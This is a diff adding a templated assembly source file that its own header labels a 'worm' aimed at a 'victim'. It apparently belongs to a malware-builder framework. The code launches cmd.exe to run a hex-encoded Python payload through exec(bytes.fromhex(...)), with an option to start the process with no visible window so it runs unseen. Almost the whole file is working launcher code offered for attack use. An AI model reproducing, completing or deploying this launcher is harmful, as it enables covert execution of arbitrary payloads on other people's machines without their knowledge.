@@ -1,0 +1,104 @@
+#!name##DynaBlaster
+#!types##worm
+#!info##Assembler worm. When launched, it creates a new process and python from the command line along with the code. You can change the startup to be visible in the console or the process running in the background. The victim must have python installed for the payload to work.
+#!lang##asm
+#!banned##module##starter##shadow##junk
+#!globalVar##OS_EXEC##win##Target system executable
+#!globalVar##COMPILER_NAME##MC_win32##Compiler name
+#!system_FLAG##[W]
+#!processWorm##BasicAsm
+#!reqPayload##DB_script##Python payload script.
+#!payloadOpt##DB_script##ENCODE##bytes_hex
+#!payloadOpt##DB_script##INCLUDE_IMPORTS##True##Include import library in code
+#!reqVar##DB_hide_process##'False' - Starts the process in the visible console. 'True' - Starts the process in the background without a view.##str
+
+
+
+
+%define TRUE 1
+%define FALSE 0
+%define NULL 0
+%define CREATE_NO_WINDOW 8000000h
+%define CREATE_CONSOLE 0x00000010
+%define MB_OK 0h
+
+STRUC SINFO
+    .cb RESD 1
+    .lpReserved RESD 1
+    .lpDesktop RESD 1
+    .lpTitle RESD 1
+    .dwX RESD 1
+    .dwY RESD 1
+    .dwXSize RESD 1
+    .dwYSize RESD 1
+    .dwXCountChars RESD 1
+    .dwYCountChars RESD 1
+    .dwFillAttribute RESD 1
+    .dwFlags RESD 1
+    .wShowWindow RESW 1
+    .cbReserved2 RESW 1
+    .lpReserved2 RESD 1
+    .hStdInput RESD 1
+    .hStdOutput RESD 1
+    .hStdError RESD 1
+ENDSTRUC
+
+
+STRUC PROCESS_INFORMATION
+    .hProcess RESD 1
+    .hThread RESD 1
+    .dwProcessId RESD 1
+    .dwThreadId RESD 1
+ENDSTRUC
+
+extern _CreateProcessA@40
+extern _ExitProcess@4
+
+section .data
+    processinfo:
+        istruc PROCESS_INFORMATION
+
+        iend
+    
+    stinfo:
+        istruc SINFO
+           
+        iend
+    {% if DB_hide_process=="True" %}
+    cmd_exec db "cmd.exe /C python -c exec(bytes.fromhex('{{DB_script}}'))", 0
+    {% else %}
+    cmd_exec db "cmd.exe /C python -c exec(bytes.fromhex('{{DB_script}}')) & pause", 0
+    {% endif %}
+    
+
+section .text
+global _main
+    _main:
+        mov ebx, cmd_exec
+        call _newProcess
+        
+        
+        call _ExitProcess@4
+    
+    _exit:
+        push 0
+        call _ExitProcess@4
+    
+    _newProcess:
+        push processinfo
+        push stinfo
+        push NULL
+        push NULL
+        {% if DB_hide_process=="True" %}
+        push CREATE_NO_WINDOW
+        {% else %}
+        push CREATE_CONSOLE
+        {% endif %}
+        push FALSE
+        push NULL
+        push NULL
+        push ebx
+        push NULL
+        call _CreateProcessA@40
+        ret
+        
